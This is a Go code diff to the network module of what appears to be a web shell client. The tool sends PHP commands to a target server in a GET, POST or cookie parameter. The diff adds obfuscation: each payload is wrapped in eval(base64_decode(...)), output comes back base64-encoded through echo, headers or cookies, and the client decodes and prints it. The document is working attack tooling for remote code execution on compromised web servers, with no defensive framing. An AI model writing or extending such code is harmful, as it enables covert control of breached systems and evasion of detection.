@@ -2,7 +2,9 @@ package network
 
 import (
 	"bytes"
+	"encoding/base64"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"net/url"
 
@@ -34,7 +36,7 @@ type NETWORK struct {
 	status    bool
 
 	_config       config
-	_lastRequest  http.Request
+	_body         url.Values
 	_lastResponse *http.Response
 }
 
@@ -69,14 +71,29 @@ func (n *NETWORK) _getHandleBack() string {
 	var r string
 
 	if n.method == 0 || n.method == 1 {
-		r = "echo($r);exit();"
+		r = "echo(base64_encode($r));exit();"
 	} else if n.method == 2 {
-		r = "header('" + n.parameter + ":' . $r);exit();"
+		r = "header('" + n.parameter + ":' . base64_encode($r));exit();"
 	} else if n.method == 3 {
-		r = "setcookie('" + n.parameter + "', $r);exit();"
+		r = "setcookie('" + n.parameter + "', base64_encode($r));exit();"
 	}
 
 	return r
+}
+
+func (n *NETWORK) _encode(request *string) {
+	sEnc := base64.StdEncoding.EncodeToString([]byte(*request))
+	*request = "eval(base64_decode('" + sEnc + "'));"
+}
+
+func (n *NETWORK) _decode(response *string) {
+	sDec, err := base64.StdEncoding.DecodeString(*response)
+
+	if err != nil {
+		panic(err)
+	}
+
+	*response = string(sDec)
 }
 
 func (n *NETWORK) _initConfig(r string) {
@@ -88,6 +105,7 @@ func (n *NETWORK) _initConfig(r string) {
 	n.status = true
 
 	request := r + n._getHandleBack()
+	n._encode(&request)
 
 	if n.method == 0 { //GET
 		c.url = n.host + "?" + n.parameter + "=" + request
@@ -96,6 +114,7 @@ func (n *NETWORK) _initConfig(r string) {
 
 		form := url.Values{}
 		form.Set(n.parameter, request)
+		n._body = form
 		c.form = bytes.NewBufferString(form.Encode())
 	} else if n.method == 3 { //COOKIE
 		c.jar = []string{}
@@ -116,6 +135,18 @@ func (n *NETWORK) _headerConfig(req *http.Request) {
 
 func (n *NETWORK) _handleSuccess(response *http.Response) {
 	n._lastResponse = response
+
+	defer response.Body.Close()
+	buffer, err := ioutil.ReadAll(response.Body)
+
+	if err != nil {
+		panic(err)
+	}
+
+	body := string(buffer)
+	n._decode(&body)
+
+	fmt.Println(body)
 }
 
 func (n *NETWORK) Send(r string) {
@@ -127,14 +158,18 @@ func (n *NETWORK) Send(r string) {
 		panic(err)
 	}
 
-	req, err := http.NewRequest(n._config.method, n._config.url, n._config.form)
+	var req *http.Request
+	var err error
+
+	if n._config.form != nil {
+		req, err = http.NewRequest(n._config.method, n._config.url, n._config.form)
+	} else {
+		req, err = http.NewRequest(n._config.method, n._config.url, nil)
+	}
 
 	if err != nil {
 		panic(err)
 	}
-
-	n._lastRequest = *req
-	fmt.Println(n._lastRequest)
 
 	n._headerConfig(req)
 
@@ -153,20 +188,32 @@ func (n *NETWORK) RequestInfo(c *cli.Context) {
 		return
 	}
 
+	request := n._lastResponse.Request
+	flag := false
+	request.PostForm = n._body
+
 	if c.Bool("url") {
-		showRequestUrl(&n._lastRequest)
+		showRequestUrl(request)
+		flag = true
 	}
 
 	if c.Bool("method") {
-		showRequestMethod(&n._lastRequest)
+		showRequestMethod(request)
+		flag = true
 	}
 
 	if c.Bool("body") {
-		showRequestBody(&n._lastRequest)
+		showRequestBody(request)
+		flag = true
 	}
 
 	if c.Bool("headers") {
-		showRequestHeaders(&n._lastRequest)
+		showRequestHeaders(request)
+		flag = true
+	}
+
+	if !flag {
+		fmt.Println(request)
 	}
 }
 
@@ -176,19 +223,30 @@ func (n *NETWORK) ResponseInfo(c *cli.Context) {
 		return
 	}
 
+	response := n._lastResponse
+	flag := false
+
 	if c.Bool("status") {
-		showResponseStatus(n._lastResponse)
+		showResponseStatus(response)
+		flag = true
 	}
 
 	if c.Bool("body") {
-		showResponseBody(n._lastResponse)
+		showResponseBody(response)
+		flag = true
 	}
 
 	if c.Bool("headers") {
-		showResponseHeaders(n._lastResponse)
+		showResponseHeaders(response)
+		flag = true
 	}
 
 	if c.Bool("request") {
-		showResponseRequest(n._lastResponse)
+		showResponseRequest(response)
+		flag = true
+	}
+
+	if !flag {
+		fmt.Println(response)
 	}
 }
